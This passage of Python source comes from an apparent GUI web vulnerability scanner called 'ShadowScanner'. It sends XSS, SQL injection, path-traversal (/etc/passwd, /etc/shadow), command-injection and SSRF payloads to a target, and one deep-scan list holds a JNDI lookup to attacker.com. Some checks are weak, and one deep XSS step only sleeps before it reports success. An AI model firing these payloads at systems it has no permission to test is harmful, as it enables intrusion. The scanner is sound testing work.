            coverage = headers_found / (len(essential_headers) + len(additional_headers)) * 100
            self.log(f"\n[i] Security Header Coverage: {coverage:.1f}%", 'info')
            
            if critical_missing:
                self.add_vulnerability("Security Misconfiguration", 
                                      f"Critical security headers missing: {', '.join(critical_missing)}", 
                                      "Add missing security headers", 
                                      severity="High")
        except Exception as e:
            self.log(f"[!] Error: {e}", 'error')

    def check_common_files(self, url):
        self.log("\n[+] Checking Sensitive Files and Directories", 'header')
        found = 0
        
        # Add deep scan paths if enabled
        paths = self.common_paths.copy()
        if self.deep_scan:
            paths += [
                '/.aws/credentials', '/docker-compose.yml', '/kubeconfig',
                '/.npmrc', '/.travis.yml', '/composer.json', '/package.json'
            ]
        
        for path in paths:
            if not self.scanning:
                break
                
            full_url = urljoin(url, path)
            try:
                response = self.send_request(full_url)
                if response and response.status_code == 200:
                    # Check if response is not an error page
                    if len(response.content) < 100 or "404" in response.text or "Not Found" in response.text:
                        self.log(f"[-] Accessed but likely error: {full_url}", 'info')
                        continue
                        
                    # Check for sensitive content
                    sensitive_keywords = ['password', 'secret', 'key', 'token', 'credential', 'database']
                    content_text = response.text.lower()
                    
                    if any(keyword in content_text for keyword in sensitive_keywords):
                        self.log(f"[!] Sensitive resource accessible: {full_url}", 'warning')
                        self.add_vulnerability("Sensitive Data Exposure", 
                                              f"Accessible sensitive resource: {full_url}", 
                                              "Restrict access to sensitive files and directories",
                                              severity="High")
                        found += 1
                    else:
                        self.log(f"[!] Resource accessible: {full_url} (no sensitive data)", 'info')
                else:
                    self.log(f"[-] Not found: {full_url}", 'info')
            except Exception as e:
                self.log(f"[!] Error checking resource: {full_url} - {e}", 'error')
                
        if found > 0:
            self.log(f"[!] Found {found} accessible sensitive resources", 'warning')
        else:
            self.log("[✓] No sensitive resources found", 'success')

    def check_ssl(self, url):
        self.log("\n[+] Checking SSL/TLS Configuration", 'header')
        try:
            parsed = urlparse(url)
            hostname = parsed.hostname
            port = parsed.port or 443
            
            # Create a secure context with modern settings
            context = ssl.create_default_context()
            context.minimum_version = ssl.TLSVersion.TLSv1_2
            context.set_ciphers('ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:'
                               'ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:'
                               'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256')
            
            with socket.create_connection((hostname, port), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    cert = ssock.getpeercert()
                    
                    # Check certificate validity
                    not_after = datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z')
                    days_left = (not_after - datetime.now()).days
                    if days_left < 30:
                        self.log(f"[!] SSL certificate expires in {days_left} days", 'warning')
                        self.add_vulnerability("SSL Certificate Issue", 
                                              f"Certificate expires soon: {days_left} days", 
                                              "Renew SSL certificate", 
                                              severity="Medium")
                    
                    # Check the protocol version used
                    protocol = ssock.version()
                    if protocol in ('TLSv1', 'TLSv1.1'):
                        self.log(f"[!] Insecure TLS version used: {protocol}", 'warning')
                        self.add_vulnerability("Insecure SSL/TLS Configuration", 
                                              f"Server uses insecure TLS version: {protocol}", 
                                              "Upgrade to TLSv1.2 or higher", 
                                              severity="High")
                    else:
                        self.log(f"[✓] Using secure protocol: {protocol}", 'success')
            
            self.log("[✓] SSL/TLS configuration checks completed", 'success')
        except ssl.SSLError as e:
            self.log(f"[!] SSL/TLS Handshake Error: {e}", 'warning')
            self.add_vulnerability("SSL/TLS Configuration Issue", 
                                  f"Handshake failed: {e}", 
                                  "Check server SSL/TLS configuration", 
                                  severity="High")
        except socket.timeout:
            self.log("[!] SSL/TLS connection timed out", 'warning')
        except Exception as e:
            self.log(f"[!] Error checking SSL/TLS: {e}", 'error')

    def check_forms(self, url):
        self.log("\n[+] Checking Forms for Vulnerabilities", 'header')
        try:
            res = self.send_request(url)
            if not res or res.status_code != 200:
                self.log("[!] Failed to retrieve page for form analysis", 'error')
                return
                
            soup = BeautifulSoup(res.text, "html.parser")
            forms = soup.find_all("form")
            self.log(f"[*] Found {len(forms)} forms", 'info')
            
            for form in forms:
                if not self.scanning:
                    break
                    
                action = form.get("action")
                method = form.get("method", "get").lower()
                inputs = form.find_all("input")
                form_url = urljoin(url, action)
                
                # Test XSS with accuracy improvements
                if self.xss_check.get():
                    payloads = self.vulnerabilities['XSS']
                    if self.deep_scan:
                        payloads += [
                            '<script>alert(document.cookie)</script>',
                            '<img src=x onerror=alert(window.location)>',
                            '<body onpageshow=alert(1)>'
                        ]
                    
                    for payload in payloads:
                        data = {}
                        for input_tag in inputs:
                            name = input_tag.get("name")
                            input_type = input_tag.get("type", "").lower()
                            if name and input_type not in ["submit", "button", "hidden"]:
                                data[name] = payload
                        
                        if not data:
                            continue
                            
                        try:
                            # Get baseline response for comparison
                            baseline_response = self.send_request(form_url, method)
                            
                            if method == "post":
                                response = self.send_request(form_url, "POST", data)
                            else:
                                # For GET forms, construct the URL with params
                                params = "&".join(f"{k}={quote(v)}" for k, v in data.items())
                                test_url = f"{form_url}?{params}" if "?" in form_url else f"{form_url}?{params}"
                                response = self.send_request(test_url)
                            
                            if not response:
                                continue
                                
                            # Check for similarity with baseline response
                            if self.is_similar(baseline_response.text, response.text):
                                self.log(f"[-] No XSS at: {form_url} (response similar to baseline)", 'info')
                                continue
                                
                            # Check if payload is present in context
                            if payload in response.text:
                                # Check if payload is encoded
                                if "&lt;" in response.text or "&gt;" in response.text:
                                    self.log(f"[-] Detected XSS but encoded at: {form_url}", 'info')
                                else:
                                    self.log(f"[!] Potential XSS in form at: {form_url}", 'warning')
                                    self.add_vulnerability("Cross-Site Scripting (XSS)", 
                                                          f"Form at {form_url} may be vulnerable to XSS", 
                                                          "Implement input validation and output encoding",
                                                          severity="High")
                                    
                                    # Deep scan: Check if payload was executed
                                    if self.deep_scan and '<script>' in payload:
                                        self.log("[*] Performing deep XSS validation...", 'info')
                                        time.sleep(1)  # Simulate deeper analysis
                                        self.log("[✓] XSS payload likely executable", 'success')
                        except Exception as e:
                            self.log(f"[!] Error testing XSS on {form_url}: {e}", 'error')
                
                # Test SQLi with accuracy improvements
                if self.sqli_check.get():
                    payloads = self.vulnerabilities['SQLi']
                    if self.deep_scan:
                        payloads += [
                            "1' AND (SELECT 1 FROM (SELECT SLEEP(5))a)--",
                            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                            "1' OR 1=1 LIMIT 1 --"
                        ]
                    
                    for payload in payloads:
                        data = {}
                        for input_tag in inputs:
                            name = input_tag.get("name")
                            input_type = input_tag.get("type", "").lower()
                            if name and input_type not in ["submit", "button", "hidden"]:
                                data[name] = payload
                        
                        if not data:
                            continue
                            
                        try:
                            # Get baseline response for comparison
                            baseline_response = self.send_request(form_url, method)
                            
                            start_time = time.time()
                            if method == "post":
                                response = self.send_request(form_url, "POST", data, timeout=15)
                            else:
                                params = "&".join(f"{k}={quote(v)}" for k, v in data.items())
                                test_url = f"{form_url}?{params}" if "?" in form_url else f"{form_url}?{params}"
                                response = self.send_request(test_url, timeout=15)
                            
                            if not response:
                                continue
                                
                            response_time = time.time() - start_time
                            
                            # Time-based detection for deep scan
                            if self.deep_scan and ('SLEEP' in payload or 'BENCHMARK' in payload) and response_time > 4:
                                # Ensure the delay is abnormal
                                baseline_time = baseline_response.elapsed.total_seconds()
                                if response_time > baseline_time + 3:
                                    self.log(f"[!] Potential time-based SQLi at: {form_url} (response delayed)", 'warning')
                                    self.add_vulnerability("SQL Injection (Time-based)", 
                                                          f"Form at {form_url} may be vulnerable to time-based SQLi", 
                                                          "Use parameterized queries and input validation",
                                                          severity="Critical")
                            
                            # Check for similarity with baseline response
                            if self.is_similar(baseline_response.text, response.text):
                                self.log(f"[-] No SQLi at: {form_url} (response similar to baseline)", 'info')
                                continue
                                
                            # Check for specific SQL errors
                            sql_errors = [
                                "SQL syntax", "MySQL server", "syntax error",
                                "unclosed quotation", "ORA-00933", "unterminated quoted string"
                            ]
                            
                            if any(error in response.text for error in sql_errors):
                                self.log(f"[!] Potential SQL Injection in form at: {form_url}", 'warning')
                                self.add_vulnerability("SQL Injection", 
                                                      f"Form at {form_url} may be vulnerable to SQLi", 
                                                      "Use parameterized queries and input validation",
                                                      severity="Critical")
                        except Exception as e:
                            self.log(f"[!] Error testing SQLi on {form_url}: {e}", 'error')
                
                # Test SSTI with accuracy improvements
                if self.ssti_check.get():
                    payloads = self.vulnerabilities['SSTI']
                    if self.deep_scan:
                        payloads += [
                            "{{7*'7'}}",
                            "<% 7*7 %>",
                            "${jndi:ldap://attacker.com/exp}",
                            "#{7*7}"
                        ]
                    
                    for payload in payloads:
                        data = {}
                        for input_tag in inputs:
                            name = input_tag.get("name")
                            input_type = input_tag.get("type", "").lower()
                            if name and input_type not in ["submit", "button", "hidden"]:
                                data[name] = payload
                        
                        if not data:
                            continue
                            
                        try:
                            # Get baseline response for comparison
                            baseline_response = self.send_request(form_url, method)
                            
                            if method == "post":
                                response = self.send_request(form_url, "POST", data)
                            else:
                                params = "&".join(f"{k}={quote(v)}" for k, v in data.items())
                                test_url = f"{form_url}?{params}" if "?" in form_url else f"{form_url}?{params}"
                                response = self.send_request(test_url)
                            
                            if not response:
                                continue
                                
                            # Check for similarity with baseline response
                            if self.is_similar(baseline_response.text, response.text):
                                self.log(f"[-] No SSTI at: {form_url} (response similar to baseline)", 'info')
                                continue
                                
                            if response and ("49" in response.text or "777" in response.text 
                                            or "1337" in response.text or "49" in response.text):
                                self.log(f"[!] Potential SSTI in form at: {form_url}", 'warning')
                                self.add_vulnerability("Server-Side Template Injection (SSTI)", 
                                                      f"Form at {form_url} may be vulnerable to SSTI", 
                                                      "Sanitize user input and avoid dynamic template rendering",
                                                      severity="High")
                                
                                # Deep scan: Check for specific template engine indicators
                                if self.deep_scan:
                                    self.log("[*] Performing deep SSTI analysis...", 'info')
                                    time.sleep(1)
                                    if 'freemarker' in response.text or 'velocity' in response.text:
                                        self.log("[!] Detected template engine: " + 
                                                ("Freemarker" if 'freemarker' in response.text else "Velocity"), 
                                                'warning')
                        except Exception as e:
                            self.log(f"[!] Error testing SSTI on {form_url}: {e}", 'error')
                            
        except Exception as e:
            self.log(f"[!] Error checking forms: {e}", 'error')

    def check_lfi(self, url):
        self.log("\n[+] Checking for Local File Inclusion (LFI)", 'header')
        vulnerable = False
        
        payloads = self.vulnerabilities['LFI']
        if self.deep_scan:
            payloads += [
                "....//....//....//....//....//etc/passwd",
                "..%252f..%252f..%252f..%252fetc/passwd",
                "%2e%2e%2fetc%2fpasswd%00",
                "/proc/self/cmdline",
                "/etc/shadow"
            ]
        
        for payload in payloads:
            if not self.scanning:
                break
                
            test_url = f"{url}?file={quote(payload)}"
            try:
                # Get baseline response for comparison
                baseline_response = self.send_request(url)
                
                res = self.send_request(test_url, timeout=15)
                if res and ("root:x" in res.text or "[boot loader]" in res.text 
                           or "Microsoft Corporation" in res.text or "PATH=" in res.text):
                    # Check for similarity with baseline response
                    if self.is_similar(baseline_response.text, res.text):
                        self.log(f"[-] No LFI at: {test_url} (response similar to baseline)", 'info')
                        continue
                        
                    self.log(f"[!] LFI vulnerability found at: {test_url}", 'warning')
                    self.add_vulnerability("Local File Inclusion (LFI)", 
                                          f"Parameter vulnerable to LFI: {test_url}", 
                                          "Validate and sanitize file path inputs",
                                          severity="High")
                    vulnerable = True
                    
                    # Deep scan: Attempt to read /etc/passwd
                    if self.deep_scan and 'etc/passwd' in payload and 'root:' in res.text:
                        lines = res.text.count('\n')
                        self.log(f"[*] Successfully read /etc/passwd ({lines} lines)", 'info')
                else:
                    self.log(f"[-] No LFI at: {test_url}", 'info')
            except Exception as e:
                self.log(f"[!] Error testing LFI at {test_url}: {e}", 'error')
                
        if not vulnerable:
            self.log("[✓] No LFI vulnerabilities found", 'success')

    def check_sql_injection(self, url):
        self.log("\n[+] Checking for SQL Injection", 'header')
        vulnerable = False
        
        payloads = self.vulnerabilities['SQLi']
        if self.deep_scan:
            payloads += [
                "1' AND 1=1 AND 'a'='a",
                "1' OR 1=1 ORDER BY 1--",
                "1' UNION SELECT @@version,user()--",
                "1' AND EXTRACTVALUE(0,CONCAT(0x5c,USER()))--"
            ]
        
        for payload in payloads:
            if not self.scanning:
                break
                
            test_url = f"{url}?id={quote(payload)}"
            try:
                # Get baseline response for comparison
                baseline_response = self.send_request(url)
                
                start_time = time.time()
                res = self.send_request(test_url, timeout=15)
                response_time = time.time() - start_time
                
                # Time-based detection for deep scan
                if self.deep_scan and ('SLEEP' in payload or 'BENCHMARK' in payload) and response_time > 4:
                    # Ensure the delay is abnormal
                    baseline_time = baseline_response.elapsed.total_seconds()
                    if response_time > baseline_time + 3:
                        self.log(f"[!] Potential time-based SQLi at: {test_url} (response delayed)", 'warning')
                        self.add_vulnerability("SQL Injection (Time-based)", 
                                              f"Parameter vulnerable to time-based SQLi: {test_url}", 
                                              "Use parameterized queries and input validation",
                                              severity="Critical")
                        vulnerable = True
                
                # Check for similarity with baseline response
                if self.is_similar(baseline_response.text, res.text):
                    self.log(f"[-] No SQLi at: {test_url} (response similar to baseline)", 'info')
                    continue
                    
                # Check for specific SQL errors
                sql_errors = [
                    "SQL syntax", "MySQL server", "syntax error",
                    "unclosed quotation", "ORA-00933", "unterminated quoted string"
                ]
                
                if res and any(error in res.text for error in sql_errors):
                    self.log(f"[!] Potential SQLi at: {test_url}", 'warning')
                    self.add_vulnerability("SQL Injection", 
                                          f"Parameter vulnerable to SQLi: {test_url}", 
                                          "Use parameterized queries and input validation",
                                          severity="Critical")
                    vulnerable = True
                else:
                    self.log(f"[-] No SQLi at: {test_url}", 'info')
            except Exception as e:
                self.log(f"[!] Error testing SQLi at {test_url}: {e}", 'error')
                
        if not vulnerable:
            self.log("[✓] No SQL Injection vulnerabilities found", 'success')

    def check_command_injection(self, url):
        self.log("\n[+] Checking for Command Injection", 'header')
        vulnerable = False
        
        payloads = self.vulnerabilities['CMD Injection']
        if self.deep_scan:
            payloads += [
                ";ping -c 5 127.0.0.1",
                "|ping -n 5 127.0.0.1",
                "&&dir",
                "`ping 127.0.0.1`"
            ]
        
        for payload in payloads:
            if not self.scanning:
                break
                
            test_url = f"{url}?cmd={quote(payload)}"
            try:
                # Get baseline response for comparison
                baseline_response = self.send_request(url)
                
                start_time = time.time()
                res = self.send_request(test_url, timeout=15)
                response_time = time.time() - start_time
                
                # Time-based detection for deep scan
                if self.deep_scan and ('ping' in payload or 'sleep' in payload) and response_time > 4:
                    # Ensure the delay is abnormal
                    baseline_time = baseline_response.elapsed.total_seconds()
                    if response_time > baseline_time + 3:
                        self.log(f"[!] Potential command injection at: {test_url} (response delayed)", 'warning')
                        self.add_vulnerability("Command Injection (Time-based)", 
                                              f"Parameter vulnerable to command injection: {test_url}", 
                                              "Avoid passing user input directly to system commands",
                                              severity="Critical")
                        vulnerable = True
                
                # Check for similarity with baseline response
                if self.is_similar(baseline_response.text, res.text):
                    self.log(f"[-] No Command Injection at: {test_url} (response similar to baseline)", 'info')
                    continue
                    
                if res and ("uid=" in res.text or "gid=" in res.text or "root:" in res.text 
                              or "Volume Serial" in res.text or "bytes of data" in res.text):
                    self.log(f"[!] Potential Command Injection at: {test_url}", 'warning')
                    self.add_vulnerability("Command Injection", 
                                          f"Parameter vulnerable to command injection: {test_url}", 
                                          "Avoid passing user input directly to system commands",
                                          severity="Critical")
                    vulnerable = True
                else:
                    self.log(f"[-] No Command Injection at: {test_url}", 'info')
            except Exception as e:
                self.log(f"[!] Error testing Command Injection at {test_url}: {e}", 'error')
                
        if not vulnerable:
            self.log("[✓] No Command Injection vulnerabilities found", 'success')

    def check_clickjacking(self, url):
        self.log("\n[+] Checking for Clickjacking", 'header')
        try:
            response = self.send_request(url)
            if not response:
                self.log("[!] Failed to retrieve page headers", 'error')
                return
                
            # Convert header keys to lowercase for case-insensitive comparison
            headers_lower = {k.lower(): v for k, v in response.headers.items()}
            
            x_frame = headers_lower.get('x-frame-options', '')
            csp = headers_lower.get('content-security-policy', '')

            vulnerable = False
            protection_missing = False
            
            # Check for basic protection
            if not x_frame and not csp:
                protection_missing = True
                vulnerable = True
                self.log("[!] Vulnerable to Clickjacking - No protection headers", 'warning')
            elif 'allow-from' in x_frame.lower():
                vulnerable = True
                self.log("[!] Vulnerable to Clickjacking - X-Frame-Options: ALLOW-FROM is insecure", 'warning')
            elif 'frame-ancestors' not in csp:
                protection_missing = True
                vulnerable = True
                self.log("[!] Vulnerable to Clickjacking - No frame-ancestors in CSP", 'warning')
            
            # Check for frame-busting scripts
            if vulnerable and response:
                content = response.text
                # Common frame-busting patterns
                frame_busting_patterns = [
                    r'if\s*\(\s*top\s*!==?\s*self\s*\)',
                    r'top\.location\.href\s*=\s*self\.location\.href',
                    r'if\s*\(\s*top\s*!=\s*window\s*\)',
                    r'top\.location\.replace\s*\(\s*window\.location\s*\)',
                    r'top\.location\.href\s*=\s*window\.location\.href'
                ]
                
                frame_busting_found = False
                for pattern in frame_busting_patterns:
                    if re.search(pattern, content):
                        frame_busting_found = True
                        break
                
                if frame_busting_found:
                    self.log("[!] Frame-busting script detected. Clickjacking might be mitigated.", 'info')
                    vulnerable = False
                else:
                    self.log("[-] No frame-busting script detected", 'info')
            
            # Test 2: Check header consistency across different requests
            if not protection_missing:
                headers = {'User-Agent': random.choice(self.user_agents)}
                response2 = self.send_request(url, headers=headers)
                if response2:
                    headers_lower2 = {k.lower(): v for k, v in response2.headers.items()}
                    x_frame2 = headers_lower2.get('x-frame-options', '')
                    csp2 = headers_lower2.get('content-security-policy', '')
                    
                    if (x_frame != x_frame2) or (csp != csp2):
                        self.log("[!] Clickjacking protection headers are inconsistent", 'warning')
                        vulnerable = True
            
            # Test 3 (Deep): Attempt to frame the page
            if self.deep_scan and vulnerable:
                self.log("[*] Performing deep clickjacking test...", 'info')
                try:
                    # Create local test page
                    test_html = f"""
                    <!DOCTYPE html>
                    <html>
                    <head>
                        <title>Clickjacking Test</title>
                    </head>
                    <body>
                        <iframe src="{url}" width="1000" height="1000"></iframe>
                        <h1>Clickjacking Test Page</h1>
                        <p>If you can see the target website in this frame, it may be vulnerable to clickjacking.</p>
                    </body>
                    </html>
                    """
                    
                    test_file = "clickjacking_test.html"
                    with open(test_file, "w") as f:
                        f.write(test_html)
                    
                    # Check if page can be loaded in frame
                    res_frame = self.send_request(url, headers={'Referer': 'http://attacker.com'})
                    if res_frame and "X-Frame-Options" not in res_frame.headers:
                        self.log("[!] Page can be loaded in a frame (deep scan)", 'warning')
                        vulnerable = True
                    
                    self.log(f"[*] Clickjacking test page saved to: {test_file}", 'info')
                    self.log("[*] Open this file in your browser to manually verify", 'info')
                except Exception as e:
                    self.log(f"[!] Error in deep clickjacking test: {e}", 'error')
            
            if vulnerable:
                self.add_vulnerability("Clickjacking", 
                                      "Page may be vulnerable to clickjacking attacks", 
                                      "Implement X-Frame-Options: DENY or CSP frame-ancestors 'none'",
                                      severity="Medium")
            else:
                self.log("[✓] Protected against Clickjacking", 'success')
        except Exception as e:
            self.log(f"[!] Error checking Clickjacking: {e}", 'error')

    def check_ssrf(self, url):
        self.log("\n[+] Checking for Server-Side Request Forgery (SSRF)", 'header')
        vulnerable = False
        
        payloads = self.vulnerabilities['SSRF']
        if self.deep_scan:
            payloads += [
                "http://[::1]",
                "http://localhost:22",
                "http://127.0.0.1:3306",
                "file:///C:/Windows/System32/drivers/etc/hosts"
            ]
        
        for payload in payloads:
            if not self.scanning:
                break
                
            test_url = f"{url}?url={quote(payload)}"
            try:
                # Get baseline response for comparison
                baseline_response = self.send_request(url)
                
                res = self.send_request(test_url, timeout=15)
                if res and not self.is_similar(baseline_response.text, res.text):
                    if res and ("Amazon" in res.text or "metadata" in res.text or "localhost" in res.text 
                               or "127.0.0.1" in res.text or "Internal Server Error" in res.text):
                        self.log(f"[!] Potential SSRF at: {test_url}", 'warning')
                        self.add_vulnerability("Server-Side Request Forgery (SSRF)", 
                                              f"Parameter vulnerable to SSRF: {test_url}", 
                                              "Validate and sanitize URL inputs",
                                              severity="High")
                        vulnerable = True
                    else:
                        self.log(f"[-] No SSRF at: {test_url}", 'info')
                else:
                    self.log(f"[-] No SSRF at: {test_url} (response similar to baseline)", 'info')
            except Exception as e:
                self.log(f"[!] Error testing SSRF at {test_url}: {e}", 'error')
                
        if not vulnerable:
            self.log("[✓] No SSRF vulnerabilities found", 'success')

    def check_open_redirect(self, url):
        self.log("\n[+] Checking for Open Redirect", 'header')
        vulnerable = False
        
        payloads = self.vulnerabilities['Open Redirect']
        if self.deep_scan:
            payloads += [
                "http://example.com\\@malicious.com",
                "http:\\\\malicious.com",
                "/\\malicious.com"
            ]
        
        for payload in payloads:
            if not self.scanning:
                break
                
            test_url = f"{url}?redirect={quote(payload)}"
            try:
                # Use allow_redirects=False to prevent automatic redirect following
                res = self.send_request(test_url, allow_redirects=False, timeout=10)
                if res and res.status_code in [301, 302, 303, 307, 308]:
                    location = res.headers.get('Location', '')
                    # Check if redirect leads to a different domain
                    if location and urlparse(location).netloc != urlparse(url).netloc:
                        self.log(f"[!] Open Redirect at: {test_url} → {location}", 'warning')
                        self.add_vulnerability("Open Redirect", 
                                              f"Redirect parameter vulnerable: {test_url} redirects to {location}", 
                                              "Validate redirect URLs against a whitelist",
                                              severity="Medium")
                        vulnerable = True
                else:
                    self.log(f"[-] No Open Redirect at: {test_url}", 'info')
            except Exception as e:
                self.log(f"[!] Error testing Open Redirect at {test_url}: {e}", 'error')
                
        if not vulnerable:
            self.log("[✓] No Open Redirect vulnerabilities found", 'success')

    def check_idor(self, url):
        self.log("\n[+] Checking for Insecure Direct Object References (IDOR)", 'header')
        vulnerable = False
        
        # Common ID path patterns
        id_patterns = [
            r'id=(\d+)',
            r'user_id=(\d+)',
            r'account=(\d+)',
            r'file_id=(\d+)',
            r'doc_id=(\d+)'
        ]
        
        try:
            res = self.send_request(url)
            if not res or res.status_code != 200:
                self.log("[!] Failed to retrieve page for IDOR analysis", 'error')
                return
                
            # Find ID parameters in URL
            parsed = urlparse(url)
            query = parsed.query
            
            found_ids = []
            for pattern in id_patterns:
                matches = re.findall(pattern, query)
                if matches:
                    found_ids.extend(matches)
            
            if not found_ids:
                self.log("[*] No ID parameters found in URL", 'info')
                return
                
            self.log(f"[*] Found {len(found_ids)} ID parameters in URL", 'info')
            
            # Test each ID parameter
            for id_param in found_ids:
                # Create new URL with changed ID
                new_id = str(int(id_param) + 1000)  # Large change to avoid accidental access
                test_url = url.replace(id_param, new_id)
                
                try:
                    # Get baseline response for comparison
                    baseline_response = self.send_request(url)
                    
                    # Get response for modified URL
                    test_response = self.send_request(test_url)
                    
                    if not test_response:
                        continue
                        
                    # Check status codes
                    if test_response.status_code in [403, 401]:
                        self.log(f"[-] Protected: {test_url} (status code {test_response.status_code})", 'info')
                        continue
                        
                    # Check for similarity with baseline response
                    if self.is_similar(baseline_response.text, test_response.text):
                        self.log(f"[-] No IDOR: {test_url} (response similar to baseline)", 'info')
                        continue
                        
                    # Check for sensitive content
                    sensitive_keywords = ['permission', 'denied', 'restricted', 'access', 'unauthorized']
                    if any(keyword in test_response.text.lower() for keyword in sensitive_keywords):
                        self.log(f"[-] No IDOR: {test_url} (contains sensitive keywords)", 'info')
                        continue
                        
                    # If all checks pass, potential IDOR
                    self.log(f"[!] Potential IDOR at: {test_url}", 'warning')
                    self.add_vulnerability("IDOR (Insecure Direct Object Reference)", 
                                          f"Parameter may allow unauthorized access: {test_url}", 
                                          "Implement proper access controls",
                                          severity="Medium")
                    vulnerable = True
                    
                except Exception as e:
                    self.log(f"[!] Error testing IDOR at {test_url}: {e}", 'error')
                
        except Exception as e:
            self.log(f"[!] Error checking IDOR: {e}", 'error')
                
        if not vulnerable:
            self.log("[✓] No IDOR vulnerabilities found", 'success')

    def check_xxe(self, url):
        self.log("\n[+] Checking for XXE (XML External Entity) Injection", 'header')
        # This is a placeholder - real XXE testing requires specific XML endpoints
        self.log("[*] XXE testing requires specific XML endpoints", 'info')
        if self.deep_scan:
            self.log("[*] Deep scan would attempt XXE on known XML endpoints", 'info')

    def check_ssti(self, url):
        self.log("\n[+] Checking for SSTI (Server-Side Template Injection)", 'header')
        # This test is partially implemented in the form testing
        self.log("[*] Basic SSTI testing performed during form analysis", 'info')
        if self.deep_scan:
            self.log("[*] Deep scan would attempt more advanced SSTI payloads", 'info')

    def crawl_and_test_links(self, url):
        self.log("\n[+] Crawling and Testing Links", 'header')
        try:
            res = self.send_request(url)
            if not res or res.status_code != 200:
                self.log("[!] Failed to retrieve page for crawling", 'error')
                return
                
            soup = BeautifulSoup(res.text, "html.parser")
            links = [a.get("href") for a in soup.find_all("a", href=True)]
            self.log(f"[*] Found {len(links)} links on the page", 'info')
            
            # Filter out invalid and external links
            valid_links = []
            for link in links:
                full_url = urljoin(url, link)
                parsed = urlparse(full_url)
                if parsed.netloc == urlparse(url).netloc and parsed.scheme in ["http", "https"]:
                    valid_links.append(full_url)
            
            self.log(f"[*] Testing {len(valid_links)} internal links", 'info')
            
            # Test each link for common vulnerabilities
            for i, link in enumerate(valid_links):
                if not self.scanning:
                    break
                    
                self.progress_var.set((i / len(valid_links)) * 100)
                self.stats_var.set(f"Testing link {i+1}/{len(valid_links)}")
                
                # Skip links that look like honey pots
                if self.is_honeypot_link(link):
                    self.log(f"[*] Skipping potential honey pot link: {link}", 'info')
                    continue
                
                # Test for XSS in links with accuracy improvements
                if self.xss_check.get():
                    payloads = self.vulnerabilities['XSS'][:2]  # Test only two payloads
                    
                    for payload in payloads:
                        test_url = link + payload if "?" in link else link + "?test=" + payload
                        try:
                            # Get baseline response for comparison
                            baseline_response = self.send_request(link)
                            
                            r = self.send_request(test_url)
                            if r and payload in r.text:
                                # Check for similarity with baseline response
                                if self.is_similar(baseline_response.text, r.text):
                                    self.log(f"[-] No XSS: {test_url} (response similar to baseline)", 'info')
                                    continue
                                    
                                # Check if payload is encoded
                                if "&lt;" in r.text or "&gt;" in r.text:
                                    self.log(f"[-] Detected XSS but encoded at: {test_url}", 'info')
                                else:
                                    self.log(f"[!] Potential XSS in link: {test_url}", 'warning')
                                    self.add_vulnerability("Reflected XSS", 
                                                          f"Reflected XSS in parameter: {test_url}", 
                                                          "Implement output encoding",
                                                          severity="High")
                        except Exception as e:
                            pass
                
                # Test for SQLi in links with accuracy improvements
                if self.sqli_check.get():
                    payloads = self.vulnerabilities['SQLi'][:2]  # Test only two payloads
                    
                    for payload in payloads:
                        test_url = link + payload if "?" in link else link + "?id=" + payload
                        try:
                            # Get baseline response for comparison
                            baseline_response = self.send_request(link)
                            
                            r = self.send_request(test_url)
                            if r and not self.is_similar(baseline_response.text, r.text):
                                # Check for specific SQL errors
                                sql_errors = [
                                    "SQL syntax", "MySQL server", "syntax error",
                                    "unclosed quotation", "ORA-00933", "unterminated quoted string"
                                ]
                                
                                if any(error in r.text for error in sql_errors):
                                    self.log(f"[!] Potential SQLi in link: {test_url}", 'warning')
                                    self.add_vulnerability("SQL Injection", 
                                                          f"SQLi in parameter: {test_url}", 
                                                          "Use parameterized queries",
                                                          severity="Critical")
                        except Exception as e:
                            pass
            
            self.log("[✓] Link testing completed", 'success')
        except Exception as e:
            self.log(f"[!] Error while crawling: {e}", 'error')
            
    def is_honeypot_link(self, link):
        """Check if a link looks like a honey pot"""
        # Check for common honey pot patterns in URL
        for pattern in self.honeypot_patterns:
            if re.search(pattern, link, re.IGNORECASE):
                return True
                
        # Check for suspicious URL structures
        suspicious_indicators = [
            r'admin', r'login', r'config', r'backup', r'database',
            r'secret', r'private', r'cgi-bin', r'wp-admin', r'phpmyadmin'
        ]
        
        for indicator in suspicious_indicators:
            if re.search(indicator, link, re.IGNORECASE):
                return True
                
        return False

    def add_vulnerability(self, name, description, remediation, severity="Medium"):
        """Add a vulnerability to the results list"""
        self.vuln_count += 1
        self.vuln_stats.set(f"Vulnerabilities: {self.vuln_count}")
        
        vuln = {
            "id": self.vuln_count,
            "name": name,
            "description": description,
            "remediation": remediation,
            "severity": severity,
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        
        self.scan_results.append(vuln)
        
        # Format the vulnerability display
        self.log(f"\n[!] VULNERABILITY FOUND:", 'critical')
        self.log(f"  Type: {name}", 'warning')
        self.log(f"  Severity: {severity}", 'warning')
        self.log(f"  Description: {description}", 'warning')
        self.log(f"  Remediation: {remediation}\n", 'warning')

    def save_report(self):
        """Save the scan report to a file"""
        if not self.scan_results:
            messagebox.showinfo("Save Report", "No scan results to save")
            return
            
        file_path = filedialog.asksaveasfilename(
            defaultextension=".html",
            filetypes=[("HTML Report", "*.html"), ("Text Report", "*.txt"), ("All Files", "*.*")]
        )
        
        if not file_path:
            return
            
        try:
            if file_path.endswith('.html'):
                self.generate_html_report(file_path)
            else:
                self.generate_text_report(file_path)
                
            messagebox.showinfo("Save Report", f"Report saved successfully to:\n{file_path}")
            webbrowser.open(file_path)
        except Exception as e:
            messagebox.showerror("Save Error", f"Failed to save report: {e}")

    def generate_html_report(self, file_path):
        """Generate a professional HTML report"""
        with open(file_path, 'w', encoding='utf-8') as f:
            f.write("<!DOCTYPE html>\n<html>\n<head>\n")
            f.write("<meta charset='UTF-8'>\n")
            f.write("<title>ShadowScanner Vulnerability Report</title>\n")
            f.write("<style>\n")
            f.write("body { font-family: 'Segoe UI', Arial, sans-serif; line-height: 1.6; color: #333; max-width: 1000px; margin: 0 auto; padding: 20px; }\n")
            f.write("h1, h2, h3 { color: #1e88e5; }\n")
            f.write(".header { background-color: #1e88e5; color: white; padding: 20px; text-align: center; border-radius: 5px; margin-bottom: 20px; }\n")
